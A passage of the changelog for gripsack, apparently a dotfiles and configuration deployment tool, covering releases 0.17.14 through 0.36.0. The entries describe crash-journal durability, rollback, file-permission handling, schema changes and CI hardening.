  These are scheduling-only edges, not runtime/build roles or PATH exports.
  Activation targets, self-qualified refs and mixed graph cycles fail early.
- **Shell outputs are enforced**, like structured-run outputs. Warm preview
  uses the same concrete source construction and artifact identity as apply.
- **Private-file takeover records the identity actually written**. Content
  updates retain acquired permissions; source execute-bit changes do not
  grant read/write access. Store verification checks source executability
  and the receipt's mode domain; older private-copy receipts stay valid
  instead of letting repair delete healthy retained payloads.
  Template rollback restores exact permissions, even with unchanged bytes.
- **EXDEV publication syncs final permissions before publishing**; directory
  creation and publication participate in the durability boundary.

### Changed

- **Breaking alpha cutover to IR v3**: inert module/step `retries` fields
  are removed, not silently ignored. Update pinned `@gripsack/core` to
  `^0.36.0`, or use the embedded frontend. v1/v2 schemas remain historical;
  lockfiles and generations remain readable.
- Build/custom-shell/run steps are explicitly **cached artifact recipes**.
  Outputs are postconditions, not an "always run" switch. Use activation
  hooks for repeatable effects. Cross-module needs are module-granular.

### Internal

- Debug-only persistence matrix: every recorded cut in apply/deploy,
  apply/prune, rollback/deploy, rollback/prune and forced-copy scenarios,
  with I/O errors, abrupt process loss and subsequent user drift. A separate
  Rust trace model checks ordering and rejects the old chmod-after-fsync
  sequence; this is not a physical power-loss simulator.
- Cohesive lifecycle, producer and verification modules; flow tests split
  by invariant; filesystem/journal unit suites separated from production.

## [0.35.0] — 2026-09-06

Build closures (plan/0039) — a build dependency is no longer a
deployed one.

### Added

- **`dep(name, { for: "build" })`** — build-only dependencies are
  fetched and stored, never deployed merely to serve a compile.
  Build/custom/run steps prepend the transitive closure's `bin/`
  directories to PATH and receive `GRIP_DEP_<NAME>` store roots.
  Any runtime incoming edge still requires normal deployment.
- **Payload receipts and retained-history GC** — build-only manifest
  records keep verification receipts but no destinations, activation
  intents, or profile exports. Consumers record `build_closure`; all
  retained generations pin those paths until GC prunes that history.
- **Fresh dependency pins reach consumers immediately** — a cold
  apply followed by a warm one reuses the artifact; direct or
  transitive pin changes rebuild it. Rollback never rebuilds.
- Unknown `for` values receive source-labeled **E122** diagnostics.
  Ambiguous normalized `GRIP_DEP_*` names are rejected with **E123**.

### Changed

- **Breaking alpha cutover to IR v2** — `Dependency.for` replaces
  `edge`; the core accepts v2 only and rejects v1 before field
  decoding. The v1 schema remains historical documentation.
  Lockfiles and persisted generations remain readable.
- **`dep()` takes an options object** —
  `dep("rust", "build")` becomes `dep("rust", { for: "build" })`.
  `dep("git")` still defaults to runtime. Update pinned
  `@gripsack/core` to `^0.35.0` or remove the pin to use the embedded
  frontend. Core and TypeScript 0.35.0 ship together.

## [0.34.0] — 2026-09-06

The journey harness (plan/0038) — stateful property tests of user
time, and the bug it caught on its first day.

### Fixed

- **`store verify` no longer reports false corruption on preserved
  entries** — a preserved-drift record describes an OBSERVATION, not
  a store deployment; verify skips it. Found by the harness, covered
  by it.

### Internal

- `e2e/test_journey.py`: seeded random declare/apply/drift/take-over/
  undeclare/respell/rollback/update journeys against the real binary,
  with a per-destination expectation model (0029 §2 drift and prune
  semantics included) and system oracles (check, store-verify,
  generation monotonicity) after every step. Five fixed seeds; a red
  run prints its op trace.

## [0.33.0] — 2026-09-06

Rollback activation (plan/0037) — the roadmap's rollback-adapters
item, prioritized after the 0.31.0 review.

### Changed

- **`grip rollback` restores the RUNNING environment** — the target
  generation's recorded intents (service restarts, cache refreshes,
  custom hooks) re-run after the flip, durable through the same
  pending record apply uses: a kill mid-rollback-adapters resumes
  them on the next run. Modules the rollback undeclares fire their
  `on_remove` hooks. Adapter failures warn, never un-rollback.

## [0.32.0] — 2026-09-06

The fb11aaf external-review round (plan/0035) — the first review
against the shared-op architecture. Ownership identity is canonical
everywhere, verification has receipts, and `cargo install` works.

### Fixed

- **A spelling-only declaration change no longer deletes the file** —
  the manifest records the canonical destination key next to the
  declared spelling; prune, rollback, lineage, and `why-owns` all key
  on it. The reviewer's headline defect.
- **A failed verifier fails every retry** — store presence is not a
  receipt: verification runs unless a COMMITTED generation verified
  the identical produced state with identical checks; the receipt
  rides the manifest.
- **A typo'd module field (`confg:`) fails eval with a
  did-you-mean** — the TypeScript constructor rejects unknown fields
  at runtime, so a typo can never lower to an empty desired state and
  prune your files.
- **A dependency's pin update rebuilds its consumers** — the build
  key incorporates the dependency's RESOLVED identity (transport
  hash, tree hash, version), not just its declaration.
- **The activation-record write is inside the transaction boundary**
  — a failure between the first mutation and the flip compensates;
  an unreadable record blocks new mutations.
- **`cargo install gripsack` and the mise cargo route work** — the
  frontend is vendored into the crate as generated Rust (no
  build-time read of the repo tree); packaging CI asserts it.
- **Preview is read-only and accurate** — plan creates no
  directories, a satisfied owned link reads satisfied, and a deferred
  fetched destination is never shown as a prune.
- **Explicit steps carry their payload sources** — overlay and
  identity walk the normalized step graph; cross-phase `needs` that
  can't be honored are E121 at check (post-deploy effects belong in
  activate hooks).
- **`on_remove` hooks fire at removal, not install** — triggers
  survive expansion, and a removed module's hooks run from the
  previous generation's record.
- **Repo build env can't redefine operator policy** — `[eval] env`
  rejects `GRIPSACK_*` (a reserved namespace) and applies after
  runtime selection.
- **Store publication fsyncs the staged tree recursively** before the
  rename — payload bytes are durable before the final name exists,
  on the same-filesystem path too.

### Internal

- `DeployedEntry` fields are typed: `from`/`key` are paths, `hash` is
  a `ManifestHash` (constructible only from the typed producers),
  `prior` is the enum. The reviewer's `DestinationKey` ask, landed.
- Module runs take a named `ModuleInputs` bundle — no more
  nine-positional-argument signatures.

## [0.31.0] — 2026-09-06

The VM-level model harness (plan/0034's explorer extension, landed).

### Internal

- `ops/model.rs`: enumerated abstract states (absent / file at three
  modes / foreign symlink × desired content × manifest lineage ×
  take-over) are materialized onto a real filesystem, planned with
  the shipped `plan_entry_op`, and executed with the shipped
  `execute_op` — 560 cases, checked: the planner's decision IS the
  algebra's answer (plan_copy/plan_link), and the executed op lands
  exactly its recorded intent. Plan/apply agreement now has a
  machine-checked floor, not just a by-construction argument.

## [0.30.0] — 2026-09-05

One shared operation list (plan/0034) — the architecture the 0.27.0
review called for: `ts → IR → ops → execute`. One planner computes the
destination operations; `grip plan` renders it, apply executes it,
rollback plans with the target generation's manifest as the desired
state. Plan/apply agreement is by construction.

### Changed

- **`grip plan` renders the operation list apply executes** — the
  separate preview engine is gone. Drifted destinations preview as
  "drifted — kept (apply preserves)" instead of the old "(update)"
  lie, and run/shell-step modules always show their opaque effects.
- **Rollback plans through the same planner** — the Transition
  machinery and the separate restore path are deleted; `plan_copy`'s
  three-way is the rollback drift rule.

### Internal

- New `ops` module: the ISA (`Op`, kinds, authority, provenance),
  the codegen (planners over the one observation), and the executor
  (journal precondition → write → postcondition). The lineage
  explorer continues to drive the shipped decision functions, now
  through the op authority branches.
- apply's deploy and prune phases and rollback's planner are thin
  drivers over it; `diff_section`'s parallel compare logic is
  deleted.

## [0.29.0] — 2026-09-05

The 0.27.0 external-review round (plan/0033) — confidentiality of
adopted secrets, evaluation-grant scoping, and plan/apply agreement.

### Changed

- **Take-over preserves a private file's mode** — adopting a 0600
  secret keeps it 0600, live AND in the prior blob store (blobs land
  0600; `$GRIPSACK_HOME/prior` is 0700). Adoption is not a fresh
  deploy; repo-driven exec changes still apply afterward.
- **The deliberate-pin read grant is validated** — a
  `node_modules/@gripsack/core` symlink earns its eval read grant
  only when the resolved target proves it IS a `@gripsack/core`
  package (`package.json` name). A planted symlink to arbitrary
  outside content no longer enlarges the sandbox.
- **Step `needs` order execution** — a consumer declared before its
  producer runs after it; cross-module step refs (`other:done`,
  `other:step`) fold into the module DAG; cycles are E120 at check.
- **`grip plan` runs the full validation pipeline** — linters, source
  checks, and physical-destination uniqueness (E119) gate plan the
  same as check/apply; modules with opaque run/shell steps are marked
  "may change the system", never rendered as silent no-ops.
- **Preserved drift blocks a mode switch** — redeclaring a preserved
  tracked copy as an owned symlink refuses instead of overwriting
  the user's edit. The lineage explorer now models the owned-link
  branch (driving the shipped `plan_link`) and mode changes.

### Fixed

- **Executable rollback restores** — rolling back across versions of
  a 0755 tracked copy restores the right bytes (0.27 compared
  identities across domains and kept the newer content).
- **Private merge files roll back** — updating a managed block in a
  0600 file then rolling back no longer reports a phantom change.
- **Adoption codegen** — digit-leading names and quote/backslash
  filenames produce valid TypeScript (idents prefixed, every
  interpolated string JSON-quoted).

## [0.28.0] — 2026-09-05

Durable activation hooks (plan/0032) and a legacy-purged, fully typed
identity layer.

### Changed

- **Activation hooks are durable** — the pending intent record
  (`$GRIPSACK_HOME/activation.json`) is written BEFORE the generation
  flip, so a kill between the flip and the adapters (or mid-adapters)
  no longer silently skips your service restarts and cache refreshes:
  the next run resumes them. The protocol is model-checked in TLA+
  (`specs/Activation.tla`, TLC in CI; the pre-0.28 shape fails the
  NoSilentSkip invariant as a kept mutant).
- **Intents may run twice across a crash** — they are idempotent
  refreshes by contract; write `customHook` scripts idempotent.
  A record naming a generation that never became current is
  discarded, never run.
- **Recovery notes are typed** — `grip rollback` output and the
  interrupted-run report distinguish severities (a kept post-crash
  edit warns) instead of flattening to strings.

### Removed (alpha hygiene — no legacy homes exist)

- The pre-0.23 journal marker compatibility path and its `format`
  field: a marker missing `previous_generation` now fails closed at
  parse (torn/corrupt), never mistaken for a fresh-machine run.
- The 0.26-compatible exec-bit identity preimage: identities are
  uniformly mode-aware. Homes written by ≤0.27 read drifted once;
  `grip apply --take-over` re-pins.
- Journal priors always carry a mode; manifests' `Prior` is now the
  enum shape (`file`/`symlink` variants, no `content: Option`).

### Internal

- The identity domains are typed end to end: `PayloadHash` /
  `BytesHash` / `FileIdentity` newtypes, `ObjectIdentity` and
  `Intended` at the journal boundary. The pass caught three latent
  domain mixups (prune authority, store-verify, rollback compares) —
  each is an e2e-covered fix now.
- The legacy counterexample plumbing left the transaction model
  (Rust harness AND the TLA+ `MODE="legacy"` branch); mutation
  calibration keeps the harness honest, plan/0028 keeps the record.

## [0.27.0] — 2026-09-05

Mode-aware identity (plan/0031 — completes 0026 §7 and 0030 #17) —
the full permission mode joins the manifest and journal identity:
chmod-only drift is detected, and rollback restores modes exactly.

### Changed

- **Chmod-only drift is drift** — a tracked copy whose mode changed
  without a content change is preserved-and-warned on the next apply,
  never silently reverted and never treated as satisfied.
- **Rollback restores the exact mode** — the manifest records each
  deployed file's landed mode and rollback re-applies it (the crash
  journal has done this since 0.24; the generation path now matches).
- **Deterministic landing modes** — fresh templates and merge-created
  files land 0644 absolutely instead of `0666 & ~umask`; the
  journaled precondition no longer depends on the process umask.
  (Behavior change only for fresh creates under a non-022 umask.)
- **A take-over lands the managed mode** — the absorbed file is ours
  after a take-over; it gets the 0644/0755 rule like any deploy
  instead of keeping the foreign file's mode.
- **E119 diagnostics** — the physical-destination-alias gate
  (0.26.0) reports with a stable code, both spellings, spans on both
  module declarations, and a help line, in `check` and `apply`.

### Upgrade notes

Seamless: the identity preimage for 0644/0755 is byte-identical to
0.26's exec-bit form, so existing homes read satisfied — no spurious
drift, no mass re-deploy.

### Internal

- The lineage explorer models destination ALIASES (two spellings of
  one physical cell — the E119 gate contract is now a checked model
  property: an aliased run cannot mutate anything) and chmod drift
  (`ExternalChmod`), still driving the shipped decision functions.
- `journal.rs` and `deploy.rs` split into module directories
  (marker/recover/model; restore/remove) — no more >1000-line files.
- The recovery classifier takes a named `RecoveryFacts` struct.

## [0.26.0] — 2026-09-05

Canonical destinations and hardened transaction identity
(plan/0030, sixth fresh-eyes audit) — one physical file now has one
identity everywhere gripsack looks, and the crash/ownership
protocols gained their last proven-unsound edge cases.

### Changed

- **Destination aliases are rejected before any mutation** —
  `~/.x`, `$HOME/.x`, `/home/me/.x`, and a path through a symlinked
  ancestor are one directory entry; declaring two spellings (even
  across modules) is now a hard `grip check`/`apply` error instead
  of a silent double-transition of one object. E111 also fires for
  duplicates inside a single module, which previously slipped
  through and double-journaled the destination.
- **A second `--take-over` no longer rebases the restore point** —
  the drifted bytes are still captured for crash recovery, but the
  manifest keeps the epoch's FIRST pre-adoption origin: undeclare
  restores what was there before gripsack ever touched the file.
- **Renaming a module keeps full lineage authority** — rename plus
  content change applies as an authorized update (no more
  preserved-as-foreign), and undeclare after a rename still
  restores the origin.
- **Tracked copies own the executable bit** — a fresh 0755 deploy
  lands executable, the next apply is satisfied instead of
  flip-flopping, and an exec-bit change from the repo applies.
- **Pre-0.23 journal run markers refuse closed** — the old
  direction rule is model-proven unsound for the markers 0.22
  wrote; recovery now stops with guidance instead of guessing.
- **Store hardening** — `current` resolving outside
  `$GRIPSACK_HOME/generations` is corruption (error, not a
  generation); manifests reject `from` paths that escape the store
  (`../x`, absolutes) and duplicate destinations across ALL
  ownership modes; the intra-apply race (an external write between
  drift check and mutation) is aborted, never clobbered.

## [0.25.0] — 2026-09-05

Ownership lineage and authorized transitions (plan/0029, fifth
fresh-eyes audit) — the state-representation round: observed user
bytes can no longer become overwrite authority, and the pre-adoption
origin rides the whole ownership epoch. The ownership algebra joins
the crash protocol in the model harness (Rust explorer driving the
real `plan_copy`, plus `Ownership.tla` alongside `Transaction.tla`).

### Fixed

- **The pre-adoption origin is no longer dropped by the next ordinary
  apply.** `prior` is carried forward per destination across every
  generation — module renames included — and stays pinned against gc
  until the epoch ends by restore. (0.24 attached it to one deployment
  result; an origin could vanish and be gc'd.)
- **Preserved drift never promotes to authority.** A kept drifted or
  foreign file is recorded with `preserved_drift`; repeated applies
  keep it until you converge by hand (write the desired content) or
  take over explicitly. Previously the observed hash became the
  recorded deployment, so the NEXT apply overwrote your bytes.
- **Undeclaring a drift-kept module no longer deletes your file** —
  the recorded observed hash used to pass prune's intact check.
  Preserved-drift entries are never pruned or rolled back over.
- **`grip adopt` captures the origin even when content matches** — a
  file adopt's scoped take-over set named `dest/dest-basename` and
  never matched; and `--take-over` now opens the epoch before the
  satisfied check, since content-equal adoption still needs the prior.
- **Every journaled mutation carries a precondition** — the live
  object must equal what the drift decision saw (absent counts), or
  the run aborts retryably instead of clobbering a write that landed
  in between. Merge re-derives its splice from the latest foreign
  content at the mutation boundary.
- **Recovery verifies its own work** — a restore is re-read and must
  equal the prior identity before the journal entry may be dropped;
  failed removals and failed link reads propagate instead of reading
  as absence.
- **Foreign or dangling symlinks at copy/template destinations refuse**
  (or take over, capturing the link as prior) — `exists()` used to
  follow links, reading a dangling link as "absent" and losing its
  identity.
- **Store integrity is proven, not named** — prior blobs recompute on
  reuse (a corrupt blob quarantines aside); rollback preflight
  verifies each module's `tree256` against the actual tree.
- **`current` must resolve under `$GRIPSACK_HOME/generations/<N>`**
  with N matching — `current -> /tmp/42` is corruption, not a
  generation. Owned-link intactness compares the EXACT expected store
  target, not "somewhere under gripsack".
- **Persisted-generation validation and merge semantics agree** —
  merge blocks validate per (destination, module); several modules may
  own blocks in one file, and publish validates what load would
  reject.
- **High-water moves before the rename** and a post-commit cleanup
  failure reports "generation N active; cleanup pending" instead of a
  failed apply.

## [0.24.0] — 2026-09-04

Provable transactions and validated generations (plan/0027, fourth
fresh-eyes audit). The two principles of this release: a transaction
never commits a destination that didn't reach its declared state, and
persisted state is never treated as absent because it couldn't be
read.

### Fixed

- **Transactions verify their postcondition.** Every journaled
  mutation re-reads the destination through the pinned capability
  afterward and requires live == intended — a helper returning success
  without producing the state now fails the run (and compensation
  restores the prior) instead of committing a lie. The bool-returning
  removal/restore helpers are `Result`: an I/O failure no longer
  reads as "drifted, kept".
- **GC fails closed.** An unreadable `generations/` inventory errors
  instead of collecting the active generation's store objects; the
  current generation must be present in the inventory and every
  retained manifest must validate before a deletion plan exists.
- **Persisted generations are strictly validated** at the one
  boundary (`read_manifest`): embedded number must equal the
  directory, destinations unique (case-folded, E111 applies to
  history), content hashes well-formed, store paths confined to
  `$GRIPSACK_HOME/store`. A current generation whose manifest is
  unreadable now blocks apply and rollback instead of planning
  without the authoritative state.
- **A generation publishes as one immutable object** — manifest and
  env profile stage under `generations/.staging-<N>` and rename in
  no-clobber; a failed apply leaves nothing visible. Rollback only
  backfills a MISSING profile (pre-0.22 history), never rewrites a
  generation.
- **Generation IDs never reuse, even across GC of the tip** — a
  durable `generations/high-water` mark drives allocation.
- **The crash journal restores exact file modes** — priors record the
  Unix mode, and recovery writes with it riding the rename
  (temp → chmod → fsync → rename). A 0600 secret replaced by a
  symlink mid-run comes back 0600, not umask-default.
- **Capture, compare, and mutate share one pinned parent capability**
  through prune and rollback helpers — no ambient-path reopens
  mid-transition.

## [0.23.0] — 2026-09-04

Generation identity and path-centric transactions (plan/0026, third
fresh-eyes audit) — the journal now records INTENT, and rollback
plans per destination.

### Fixed

- **Rollback no longer clobbers tracked-copy drift.** Shared
  destinations restore only when live state IS the current
  generation's deployment; live == target is a no-op; anything else
  is preserved with a report line (`kept … your edit stands`).
- **A destination gets exactly one transition per rollback.** The
  pre-0.23 two-pass rollback (prune by module, then restore)
  journaled a renamed module's destination twice — the second entry
  overwrote the true pre-rollback prior, so a killed rollback could
  restore the wrong state. The planner now normalizes both
  generations into destination-keyed maps first.
- **Generation numbers are never reused.** Allocation is
  `max(on-disk, current) + 1`, not `current + 1` — a post-rollback
  apply creates generation 4, not a rewritten 2. `write_manifest`
  refuses an existing generation number outright.
- **Commit detection is exact-equality, not ordering.** The run
  marker carries `previous_generation`; reconcile decides committed
  iff `current == target`, uncommitted iff `current == previous`,
  and refuses to guess otherwise. Roll-FORWARD (`grip rollback` to a
  newer generation) no longer breaks the classification.
- **The intended post-state is journaled BEFORE the mutation** —
  `record` persists prior and intent together; `mark_after` is gone.
  A post-crash user edit is now distinguishable from the mutation
  itself (three-way decide: landed-intact → restore, never-landed →
  nothing to do, neither → user's edit wins).
- **Journal cleanup is two durability barriers** — entries deleted
  and fsync'd, then the marker deleted and fsync'd: marker durably
  gone now implies entries durably gone.
- **Content updates preserve the destination's mode** — an apply
  touching a 0600 secret or 0755 script no longer re-lands it at
  0644&umask.
- **`current` generation readers fail closed** — permission errors,
  I/O failures, and a `current` link that parses to no generation are
  errors, not "no generations" (apply allocates from it; gc protects
  it).
- **Rollback preflights the target generation** — a missing store
  path or entry source aborts before the first mutation.
- **Renaming a merge-block's module moves the block** — block prune
  keys on (module, destination); the old module's block no longer
  lingers as an unowned ghost.

## [0.22.0] — 2026-09-04

Transaction coverage for everything that mutates a destination
(plan/0025, fresh-eyes review of 0.21.1).

### Changed

- **The exported env profile is generation-local** — it now lives at
  `generations/<N>/env/profile.sh`, sourced through
  `$GRIPSACK_HOME/current/env/profile.sh`, so it activates with the
  generation flip on apply AND rollback (previously two asymmetric
  windows existed either side of the flip). **If your rc file sources
  the old `env/profile.sh` path, update it to
  `current/env/profile.sh`** — the old file is removed on the next
  apply. The rc-side path stays stable; it just resolves through
  `current` now.

### Fixed

- **`grip rollback` runs the same journaled transaction as apply** —
  run marker (with an op kind; a rollback's commit condition
  inverts), per-destination entries, flip, commit. A kill mid-
  rollback is recovered by the next run; an ordinary failure restores
  the pre-rollback state before returning.
- **Prune-on-undeclare mutations are journaled.** A kill between
  prune and the flip previously left pruned destinations removed
  under the old generation with no record; reconcile now restores
  them before the run proceeds.
- **The journal drift guard actually matches now.** `decide` compared
  `mark_after`'s identity against the raw sha256 of the destination,
  but deploy has always recorded the canonical bytes hash — the two
  never matched, so recovery *kept* every file entry instead of
  restoring it. Latent since 0.19.0; the unit and e2e tests pinned
  the same wrong pairing, which is why it survived. Found by this
  round's kill-point e2e (real SIGABRT windows, not crafted state).
- **Failed applies and rollbacks compensate through one path** — the
  journal's own reconcile — covering lockfile/prune/manifest/env
  errors after the scheduler, not just scheduler failures.
- **Take-over prior capture fails closed.** `capture_prior` collapsed
  permission/I/O/UTF-8 errors into "no prior existed"; only NotFound
  means absent now, and non-UTF-8 symlink targets refuse the
  take-over (matching the journal's rule). The pre-adoption state is
  the product's central promise; it is never silently unrecoverable.
- **Journal reconcile fsyncs its deletions and fails closed on
  unreadable commit evidence** (run marker, `current`) — permission
  and I/O errors are not "absent" in recovery code.
- **Cross-filesystem (EXDEV) store publishes preserve permissions**
  — the 0.21.0 capability copy path re-created files with default
  modes, dropping exec bits and the store's read-only policy, and
  skipped file/dir fsyncs. Covered by a real two-filesystem test
  (tmpfs → disk).

## [0.21.2] — 2026-09-04

### Fixed

- **`doctor`'s upgrade advice pins the minor line**
  (`@gripsack/core@^0.21.0`), not the exact embedded patch —
  `^0.21.1` cannot resolve when npm's latest is 0.21.0, and the
  frontend doesn't republish on every core patch (plan/0024,
  follow-up caught by smoke-testing the shipped 0.21.1 binary).

## [0.21.1] — 2026-09-04

Review-round fixes (plan/0024) from a real 0.18.1→0.21.0 migration
report.

### Fixed

- **Merge blocks: the scan sees every block a module owns.** A
  duplicate managed block was invisible in steady state, the marker
  `sha=` content guarantee covered only the first block, and a
  drifted first block's repair silently deleted the rest. Apply now
  reconciles to one block and the report names it (`removed N
  duplicate blocks`); prune/rollback remove all of a module's blocks.
- **`plan` compares template and merge entries in deployed terms** —
  rendered bytes and the trimmed block, not the raw repo source that
  could never match — and consults the destination, so `(update)`
  means "apply would write" in both directions: no permanent phantom
  updates, and hand-edited merge blocks (visible from the `sha=`
  marker alone) show as drift instead of `satisfied`.
- **`doctor`'s stale-`@gripsack/core`-pin line is a yellow `warn`,
  not a green `ok`** (the marker replacement was a no-op), and its
  upgrade advice is followable: `@gripsack/core` 0.21.0 is now
  published to npm in lockstep with the embedded frontend.

## [0.21.0] — 2026-09-04

Capability-based filesystem writes (plan/0021), an in-binary SBOM
(plan/0022), and one portability fix (plan/0023).

### Changed

- **E111 case-folds destinations on every host** — the 0.20.0 check
  folded case only when the host reported `os: macos`; it now folds
  unconditionally. The check protects the repo's portability, not
  the current host: a repo written on Linux no longer corrupts on a
  Mac (case-insensitive filesystems treat `~/Foo` and `~/foo` as one
  file). Case-variant destinations were ~always typos anyway.
- **Filesystem writes go through capability-relative paths**
  (plan/0021) — the journal, generation flip, store publishes, and
  deploy destinations now name files relative to a directory handle
  opened once (cap-std/rustix), so a path component swapped between
  gripsack's check and its write cannot redirect the write (TOCTOU).
  No behavior change; every existing unit and e2e test passes with
  its assertions untouched.

### Added

- **In-binary SBOM on every release binary** — release builds now go
  through `cargo auditable`, embedding the full dependency tree into
  `grip` itself. Audit any installed binary directly: `cargo audit
  bin "$(which grip)"`. The release workflow audits the shipped,
  stripped tarball binary and fails the release if the embed is
  missing or an advisory matches.

## [0.20.0] — 2026-09-04

The macOS hardening round + release attestations (plan/0020's two
queued items), plus an e2e harness rebuilt for cross-platform CI.

### Added

- **macOS behavioral CI** — the full 93-test flow suite now runs
  natively on a macOS runner every push (not just release builds):
  APFS rename/symlink semantics, case-insensitive filesystems, and
  Gatekeeper behavior get exercised per-commit, where findings are
  cheap.
- **Signed release attestations** — every release tarball carries
  GitHub build provenance, verifiable with `gh attestation verify
  <tarball> -R gripsack-dev/gripsack`.
- **E111 folds case on macOS hosts** — APFS is case-insensitive by
  default: `~/Foo` and `~/foo` are the same file but distinct
  strings, so two modules could claim one destination and race in
  parallel deploy. The duplicate-destination pass now case-folds
  when the host reports `os: macos` (and says so in the message).

### Fixed

- **Provisioned Deno is Gatekeeper-safe** — the pinned runtime
  download lands with a quarantine xattr on macOS (downloaded
  archive), which can kill or translocate the binary at exec. The
  attribute is stripped best-effort after the sha256 verification
  that already proves the bytes.
- **The e2e timing tests no longer flake on slow runners** — both
  wall-clock assertions (`elapsed < 0.9`, `elapsed < 3.5`) are now
  self-relative: each test measures its own baseline (serial, or
  budget-limited) in the same sandbox and asserts the delta. A slow
  machine slows both sides equally. Both passed on the WSL2 host
  that used to flake them.
- **e2e failures print the grip run log** — the sandbox fixture now
  tails the last 25 JSONL lines of the failed run's log into the
  pytest output (bazel keeps per-test logs for the same reason):
  CI failures on a platform you can't run locally are debuggable
  from the log, not archaeology.

## [0.19.2] — 2026-09-04

- **Journal cleanup is now durable.** `commit_run`/`end_run` fsync the
  journal directory after deletions: a power loss mid-cleanup could
  previously resurrect an entry whose sibling run-marker deletion WAS
  durable — reconcile would then read no marker and restore a
  committed generation's priors. Edge of an edge, but it is the
  invariant (review's fsync point, the one line of the transaction
  protocol 0.19.1 skipped).

## [0.19.1] — 2026-09-03

From an external architecture review — every source-level finding was
verified against the code before fixing (plan/0020 records the full
adopt/reject triage).

### Fixed

- **Crash between the flip and journal cleanup read as a crash before
  it.** The journal had no notion of the generation it belonged to:
  killed after `current` flipped but before cleanup, the next apply
  restored priors the committed generation already owned — a hybrid
  state, the exact invariant the journal exists to prevent. Runs now
  declare their target generation before the first mutation
  (`journal/run.json`); recovery compares it against `current`:
  committed → clean up and the deployed state stands, uncommitted →
  restore. Unit tests pin both crash positions.
- **Corrupt recovery metadata failed open.** An unparseable journal
  entry was silently deleted ("archaeology"). Now it moves to
  `journal/quarantine/` and blocks mutation with the path and the
  remediation in the error — the one structure that recovers user
  files is never shrugged off.
- **A permission error on a destination read as "absent."** Only
  `NotFound` means absent now; recovery could previously have REMOVED
  a destination it could not even read. Non-UTF-8 symlink targets are
  refused loudly instead of recorded lossily (they would have
  restored as a different link).
- **Cross-filesystem store publication copied into the final name.**
  A crash mid-copy left a partial "immutable" path every later publish
  refused. The EXDEV fallback now copies to a temp sibling under the
  store parent (same filesystem) and renames — publish is atomic on
  both paths.
- install.sh resolved the latest release by minor+patch only — 0.99.0
  would have beaten 1.0.0. Major sorts first now.
- Docs: the plugin trust model said a malicious plugin's worst outcome
  is a failed apply — true for the STORE, not the host (plugins run
  with your privileges); "the core never sees credentials" narrowed to
  the actual boundary (evaluation sees none; fetching necessarily
  can).

### Changed

- **`grip plan` labels every mutation's reversibility** (review §10):
  installs/configs print `[reversible: prior state recorded]`,
  activation intents `[best-effort: adapter re-runs, no automatic
  inverse]`, and run/custom-shell steps `[no automatic inverse: runs
  custom code]`. A plan that says what it will do now also says what
  undoing it means.

## [0.19.0] — 2026-09-03

From the third migration report (two hosts, 79 modules — the 0.18.0
breaking upgrade itself was a non-event: every module `already
satisfied`, nothing edited) plus a design addition. **Breaking** (no
legacy format tolerance — alpha, per the no-users policy).

### Fixed

- **E000 now names the module.** A type slip in a module's fields
  (e.g. `fetchStep(id, fetch)` — arguments swapped) surfaced as
  `invalid IR JSON: … at line 1 column 37202` with "this is a
  frontend bug" as the help — no module named, a byte offset nobody
  can act on, and the wrong blame. The parser now re-walks the
  modules individually and reports `invalid IR in module(s) "x",
  "y": …`, with help that points at call sites and the
  `@gripsack/core` pin first. The step builders also gained runtime
  argument guards — a swapped argument throws at the call site with
  the signature and what actually arrived, and the eval stack names
  file:line.
- **`grip doctor` compares the repo's `@gripsack/core` pin against
  the embedded frontend.** The pin doesn't change what runs (the
  deliberate-pin rule) but it is what the editor and `tsc` typecheck
  against — a `^0.17.5` pin happily accepted authoring styles 0.18
  removed. Doctor warns with the exact upgrade command when the pin's
  major.minor is behind (patch drift is npm-normal and stays quiet).
- **A run that repairs a destination now cuts a generation.** An
  owned link swapped back to the store after drift reported real
  work ("✓ linked …") and then summarized `already satisfied` — disk
  changed, no generation, rollback couldn't undo it. Satisfied now
  requires that nothing touched the filesystem.

### Changed

- **Breaking: merge blocks carry their content hash.** The open
  marker is now `# >>> gripsack module=x sha=<16hex> >>>` — the block
  is self-describing: hand-edits inside the markers are detectable
  from the file alone (no generation manifest needed), and the deploy
  report says so: `merged … (hand-edited block regenerated)`. Marker
  matching is one strict grammar (both markers scoped by module, open
  with sha); blocks written by earlier versions are no longer
  recognized and will be re-appended — remove them or re-apply with
  `--take-over`. There is no legacy path: alpha, no users to carry.

## [0.18.1] — 2026-09-02

**Crash recovery for destination mutations (plan/0019).** `apply`
mutates real destinations — owned links, tracked copies, templates,
merge blocks — before the generation flip; a `kill -9` or power loss
in that window used to leave the filesystem between generations with
no record of what to undo. Every deploy mutation is now journaled
(prior state backed up, fsync'd, before the write) and the next
`apply` restores it before doing anything else:

```
  * ⚠ recovered 1 destination(s) from an interrupted run
  a · ~/.config/a/conf.txt unchanged
already satisfied (generation 1)
```

The flip is the commit point — everything it recorded is owned by the
new generation and the journal clears. The drift guard applies on
recovery exactly as everywhere else: a file edited after the crash
keeps the user's bytes (`kept …: changed since the interrupted run —
your edit stands`). Design: plan/0019.

## [0.18.0] — 2026-09-02

**Breaking (frontend DSL): the class authoring style is removed.**
`class X extends Module` / `define(X)` is gone; the data style
(`module("name", { ... })`) is the way to author modules, with
explicit `steps:` for what declarative fields cannot say. For
parameterized families — the one thing subclassing offered —
**use a factory function**; it keeps modules values, keeps the
lockfile-visible declarative fields, and keeps spans pointing at
the call site:

```ts
function langServer(name: string, repo: string) {
  return module(name, {
    fetch: githubRelease({ repo, asset: `${name}-{version}.tar.gz` }),
    install: { [`bin/${name}`]: symlink(`~/.local/bin/${name}`) },
  });
}
```

Why: the class style lowered to step-shaped IR that hid its module
from the lockfile resolver (0.17.14's first migration finding), and
it was a third surface to keep consistent with every pinning,
plan-rendering, and diagnostics change. Modules are values; compose
them. Companion decision: no grouping/alias feature — cosmetic
grouping is a `const` array in your host file, and operational
grouping (when it ships) will be tags, which already gate.

## [0.17.14] — 2026-09-02

From a real two-host migration report and an external review. New
diagnostic E118; no IR schema change.

### Fixed

- **A `steps`-style module was invisible to the lockfile resolver.**
  Converting a module from the declarative style to the class/`steps`
  style — changing nothing else — silently dropped it out of `grip
  update` ("nothing to resolve yet"): it applied unpinned while
  `check`, `plan` and `update` all stayed quiet. The resolver now
  sees a module's single fetch step exactly like its declarative
  `fetch` field, and **E118** refuses a module with several fetch
  steps at check time (the lockfile pins one fetch per module) with
  a hint to split into modules — same-wave modules fetch in
  parallel, so nothing is lost. One consequence of E118: the
  auto-chained multi-fetch DAGs whose install edges could mis-wire
  can no longer be authored silently either.
- **A stale symlink left by an older gripsack blocked the first
  apply after upgrading, forever.** Config deployed straight from
  the checkout in old versions; the containment guard then refused
